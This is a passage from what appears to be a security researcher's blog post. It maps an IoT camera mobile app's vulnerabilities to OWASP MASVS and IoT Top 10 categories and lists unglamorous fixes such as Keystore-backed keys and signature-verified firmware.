**Mapping to industry frameworks**, for the people who'll have to fix this: OWASP MASVS is violated in MSTG-STORAGE-3/9 (F-08a), MSTG-NETWORK-1/2/3 (F-01), MSTG-CRYPTO-3/4/5 (ECB, hardcoded keys, static IV), and MSTG-RESILIENCE-2 (secrets trivially hookable). On the OWASP IoT Top 10: I1 (weak/hardcoded passwords), I2 (insecure network services), I3 (insecure ecosystem interfaces), I4 (lack of secure update mechanism the unauthenticated, cleartext-HTTP, MD5-only firmware endpoint found while scoping the cloud phase), I6 (insufficient privacy protection), and I9 (insecure default settings). That's six of ten categories touched from the *mobile app alone*.

The pattern I keep coming back to: none of these flaws required a zero-day, a debugger wizard, or novel research. A stock proxy, a rooted phone, the vendor's own decompiled code, and an afternoon each. The fixes are equally unglamorous Keystore-backed keys, per-record IVs, TLS verification *on*, salted server-side password hashing, server-side entitlement checks, HTTPS+signature-verified firmware. This ecosystem protects something genuinely intimate, for millions of households, in jurisdictions that have decided in law that this class of product must do better. The camera hardware did its job and refused to stream to a stranger's session; almost every layer of software above it would not have.

*Next post: the cloud phase where we test whether the API's object identifiers actually authorize anything, one vulnerability at a time.*
